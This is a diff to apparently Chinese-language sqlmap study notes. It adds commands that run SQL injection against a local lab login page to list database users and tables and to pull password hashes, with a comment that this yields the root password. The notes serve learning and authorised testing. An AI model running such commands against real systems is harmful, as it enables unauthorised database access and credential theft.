@@ -37,7 +37,7 @@ sqlmap -h
 
 # url
 sqlmpa -u url
-
+# 可以看到payload一些信息了。
 
 # 有提示的
 sqlmap --wizard 
@@ -71,6 +71,7 @@ sqlmap -u "url" --data="query=foobar;id=\
 1" --param-del=";" -f --banner --dbs --users
 
 # --cookie= 设置cookie
+--cookie=xxxxx
 
 # --user-agent=  请求头：浏览器信息 重要
 sqlmap -u "url" --user-agent="浏览器信息"
@@ -81,7 +82,9 @@ sqlmap -g "inurl:\".php?id=1\"" --random-agent
 # --referer 网站的来源 重要
 --referer=
 # --headers= http头
+--headers=
 # --proxy= 代理
+--proxy=
 ```
 
 
@@ -106,14 +109,19 @@ sqlmap -g "inurl:\".php?id=1\"" --random-agent
 
 ```shell
 # --users 列出注入用户
+sqlmap -u http://192.168.0.105:8000/login.php?username=admin --users
 
 # --tables 表  
+sqlmap -u http://192.168.0.105:8000/login.php?username=admin --tables
 
 # --current-db 当前数据库 
+sqlmap -u http://192.168.0.105:8000/login.php?username=admin --current-db
 
-# --passwords 密码
+# --passwords 密码 直接获取root密码了
+sqlmap -u http://192.168.0.105:8000/login.php?username=admin --passwords
 
 # --schema 系统库 --dump 数据dump出来
+sqlmap -u http://192.168.0.105:8000/login.php?username=admin --schema
 ```
 
 
